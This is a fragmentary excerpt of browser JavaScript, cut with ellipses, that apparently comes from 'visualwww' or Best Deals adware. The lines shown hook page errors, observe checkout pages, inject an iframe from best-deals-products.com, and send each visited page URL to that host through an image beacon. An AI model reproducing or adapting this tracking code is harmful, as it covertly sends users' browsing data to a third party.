...
if( window == top ){
    ...
    window.onerror = function(errorMessage, fileName, line)
    {
        ...
        try
        {
        	if (fileName.indexOf('https://www.best-deals-products.com/ws/'.split('/')[2]) > -1 && Math.floor(Math.random() * 9999) == 1)
            {
...
setQueryString = function(obj_to_add,initial_QS){
    ...
    initial_QS.replace(
        ...
        if (!visualwww.b.qsObj.dlsource) {
            visualwww.b.qsObj.dlsource = "rntgqln";
        }
        ...
        visualwww.sfdebugger = (function()
{
	...
	{
		stack: [],
		appDomain: 'https://www.best-deals-products.com/ws/',//visualwww.b.site,
        ...
        visualwww.checkoutObserver = (function()
{
	...
	return CheckoutObserver
        ...
        try
        {
            ...
            {
                request = new Image();
                request.src = 'https://www.best-deals-products.com/ws/trackSession.action?action=sample-user-traffic&dlsource='+visualwww.b.qsObj.dlsource+'&page_url=' + encodeURIComponent(document.location.href);
            }
        }
        catch(e){}
...
//    }
    ...
    return {
        ...
        if (!visualwww.utilities.blacklistHandler.isWSBlacklist() && !visualwww.utilities.blacklistHandler.isPageBlacklist() || !visualwww.utilities.blacklistHandler.isCPNBlacklist() || visualwww.utilities.blacklistHandler.isCarsDomainWhiteList())
        {
            ...
            visualwww.userData.createIframe("https://www.best-deals-products.com/ws/", function()
            {
				if(visualwww.b.WSFlow){
